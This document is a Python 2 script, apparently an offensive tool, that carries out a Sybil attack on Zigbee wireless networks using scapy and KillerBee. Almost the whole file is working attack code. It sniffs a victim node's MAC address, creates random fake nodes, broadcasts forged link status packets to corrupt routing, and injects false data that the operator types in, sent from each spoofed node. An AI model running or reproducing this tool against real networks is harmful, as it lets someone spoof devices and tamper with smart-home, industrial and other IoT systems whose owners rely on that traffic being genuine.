import time
import logging
import struct
from ctypes import*
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from base64 import b64decode
import random
import argparse
from scapy.all import (Dot15d4,
                       ZigbeeNWK,
                       ZigbeeNWKCommandPayload,
                       Dot15d4Data,
                       wrpcap,
                       LinkStatusEntry,
                       rdpcap)
from killerbee import scapy_extensions as zcapy


class AddressDecoder(Structure):
    _fields_ = [
        ('fst1', c_ubyte),
        ('fst2', c_ubyte),
        ('scd', c_ushort),
        ('trd', c_ushort),
        ('fth', c_ushort)
    ]

    def __new__(cls, address):
        return cls.from_buffer_copy(address)
    def __init__(self, address):
        pass


def pktfilter(layer):
    if layer == 'NWK':
        return lambda pkt: pkt.haslayer('ZigbeeNWK')


def GetLongMac(target_node, operative_chann):

    while True:
        pkt = zcapy.kbsniff(channel=operative_chann,
                            verbose=None,
                            lfilter=pktfilter('NWK'),
                            count=1)
        if pkt[0]['ZigbeeNWK'].source == target_node:
            long_mac = pkt[0]['ZigbeeNWK'].ext_src
            if long_mac > 0:
                return long_mac
        elif pkt[0]['ZigbeeNWK'].destination == target_node:
            long_mac = pkt[0]['ZigbeeNWK'].ext_dst
            if long_mac > 0:
                return long_mac


def seqnum_calculation(pkt):

    pkt['ZigbeeNWK'].seqnum = random.randint(1, 255)
    pkt['Dot15d4'].seqnum = random.randint(1, 255)

    #if pkt['ZigbeeNWK'].seqnum < 255:
    #    pkt['ZigbeeNWK'].seqnum +=1
    #else:
    #    pkt['ZigbeeNWK'].seqnum = 0
    return pkt


def LinkStatusProcess(*args):
    operative_chann = args[0]
    short_nodes = args[1]
    long_nodes = args[2]
    target_node = args[3]
    netid = args[4]

    with open('lstatus.dat', 'rb') as dfile:
        link_rqt = b64decode(dfile.read())

    # Fabricated link status for rest entries
    starting_long = 0
    lnk_pkt = Dot15d4(link_rqt)
    lnk_pkt['Dot15d4Data'].dest_panid = netid
    for fake_node in short_nodes:

        lnk_pkt.link_status_list = []

        lnk_entry = LinkStatusEntry()
        lnk_entry.neighbor_network_address = target_node
        lnk_entry.outgoing_cost = 1
        lnk_entry.incoming_cost = 1

        lnk_pkt['Dot15d4Data'].src_addr = fake_node
        lnk_pkt['ZigbeeNWK'].source = fake_node
        lnk_pkt['ZigbeeNWK'].ext_src = long_nodes[starting_long]
        lnk_pkt['ZigbeeNWKCommandPayload'].entry_count = 1
        lnk_pkt['ZigbeeNWKCommandPayload'].link_status_list.append(lnk_entry)

        pkt_crafted = seqnum_calculation(lnk_pkt)
        #pkt_crafted.show()

        zcapy.kbsendp(pkt=pkt_crafted,
                      channel=operative_chann,
                      count=1,
                      verbose=None)

        starting_long += 1
        time.sleep(1)


def SybilInject(*args):
    chann = args[0]
    short_nodes = args[1]
    long_nodes = args[2]
    target_node = args[3]
    target_node_long = args[4]
    netid = args[5]

    data_to_inject = raw_input('[!!] Enter false data:')

    with open('data.dat', 'rb') as filed:
        rpkt = b64decode(filed.read())

    rpkt = Dot15d4(rpkt)
    target_node_long = struct.pack('@L', target_node_long)
    addr = AddressDecoder(target_node_long)

    rpkt['ZigbeeNWK'].relay_count = addr.fst1
    rpkt['ZigbeeNWK'].relay_index = addr.fst2
    rpkt['ZigbeeNWK'].relays[0] = addr.scd
    rpkt['ZigbeeNWK'].relays[1] = addr.trd
    rpkt['ZigbeeNWK'].relays[2] = addr.fth

    rpkt['Dot15d4Data'].dest_panid = netid
    rpkt['Dot15d4Data'].dest_addr = target_node
    rpkt['ZigbeeNWK'].destination = target_node

    node_count = 0
    for nodes in short_nodes:
        node_long = struct.pack('@L', int(long_nodes[node_count]))
        addr_src = AddressDecoder(node_long)
        addr_fst = int(format(addr_src.fst2, 'x') +
                       format(addr_src.fst1, 'x'), 16)
        rpkt['ZigbeeNWK'].relays[3] = addr_fst
        rpkt['ZigbeeNWK'].relays[4] = addr_src.scd
        rpkt['ZigbeeNWK'].relays[5] = addr_src.trd
        rpkt['ZigbeeNWK'].relays[6] = addr_src.fth
        rpkt['Dot15d4Data'].src_addr = nodes
        rpkt['ZigbeeNWK'].source = nodes

        rpkt = seqnum_calculation(rpkt)
        str_pkt = str(rpkt)
        mal_pkt = Dot15d4(str_pkt[:-22]+data_to_inject)
        zcapy.kbsendp(pkt=mal_pkt, channel=chann, count=1, verbose=None)
        node_count += 1
        print '[->] Data injected by source node: {:x}'.format(nodes)
        #for i in mal_pkt['ZigbeeNWK'].relays:
        #    print hex(i)
        time.sleep(1)


def main():

    cli_args = argparse.ArgumentParser(description='Execute Sybil attack on'
                                                   'Zigbee devices')

    cli_args.add_argument('node_quantity',
                          type=int,
                          default=0,
                          help='Number of spoofed nodes - MAX=10')
    cli_args.add_argument('channel_num',
                          type=int,
                          help='Network Channel')
    cli_args.add_argument('netid',
                          help='Network ID')
    cli_args.add_argument('target_node',
                          help='Victim node')

    complete_args = cli_args.parse_args()
    node_count = complete_args.node_quantity
    operative_chann = complete_args.channel_num
    target_node = int(complete_args.target_node, 16)
    netid = int(complete_args.netid, 16)

    print '[**] Getting long MAC from target'
    long_mac = GetLongMac(target_node, operative_chann)
    print '\n[OK] Long MAC address obtained at %x' % long_mac
    print '[**] Fabricating fake nodes!'

    fabricated_nodes_short = []
    fabricated_nodes_long = []
    nodes = 0
    while nodes < node_count:
        short_addr = int(random.getrandbits(16))
        long_addr = int(random.getrandbits(64))
        fabricated_nodes_short.append(short_addr)
        fabricated_nodes_long.append(long_addr)
        print('\t[OK] Fake node {:d}->'
              'Short addr:{:x} - Long addr: {:x}'.format(nodes,
                                                         short_addr,
                                                         long_addr))
        time.sleep(1)
        nodes += 1
    print '[!!] Fake nodes ready!'
    print '[**] Creating bad links!'

    LinkStatusProcess(operative_chann,
                      fabricated_nodes_short,
                      fabricated_nodes_long,
                      target_node,
                      netid)

    launch = raw_input('\nInject data (Y/N)?>')

    if launch.lower() == 'y':
        #print hex(fabricated_nodes_long[0])
        SybilInject(operative_chann,
                    fabricated_nodes_short,
                    fabricated_nodes_long,
                    target_node,
                    long_mac,
                    netid)
    else:
        print '[!!] Done'


if __name__ == '__main__':
    main()
